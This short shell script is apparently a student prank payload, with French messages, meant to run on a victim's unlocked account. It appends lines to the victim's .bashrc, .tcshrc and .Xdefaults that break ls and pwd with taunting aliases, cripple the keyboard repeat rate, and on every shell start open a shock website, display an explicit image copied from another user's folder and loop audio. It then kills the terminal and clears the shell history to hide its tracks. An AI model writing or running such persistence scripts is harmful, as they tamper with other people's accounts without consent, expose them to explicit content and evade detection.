#!/bin/sh
echo "set prompt='%{[\033[1;5;35mJE DOIS ME LOCK OU JE VAIS ME FAIRE BIZUTER\033[0m%}] '" >> /home/${USER}/.bashrc;
echo "source ${HOME}/.bashrc" >> /home/${USER}/.tcshrc
echo "xterm*background: yellow" >> /home/${USER}/.Xdefaults
echo "alias ls='echo \"JE DOIS ME LOCK\"'" >> /home/${USER}/.bashrc
echo "alias pwd='echo \"ZLOCK C EST PAS COMPLIQUE NAN ??\"'" >> /home/${USER}/.bashrc;
echo "alias emacs=vim" >> /home/${USER}/.bashrc;
echo "alias pwd='echo \"JE SUIS LA\"'";
echo "xset r rate 3;" >> /home/${USER}/.bashrc;
echo "firefox www.meatspin.com &" >> /home/${USER}/.bashrc;
echo "mkdir /home/{$USER}/.files" >> /home/${USER}/.bashrc;
echo "cp /u/all/mazaud_c/public/test/* /home/${USER}/.files/" >> /home/${USER}/.bashrc;
echo "showimage /home/${USER}/.files/teub.jpg &" >> /home/${USER}/.bashrc;
echo "sh -c 'mplayer -loop 0 /home/${USER}/.test/mignon.mp3 &'" >> /home/${USER}/.bashrc;
pkill terminal;
history -c;
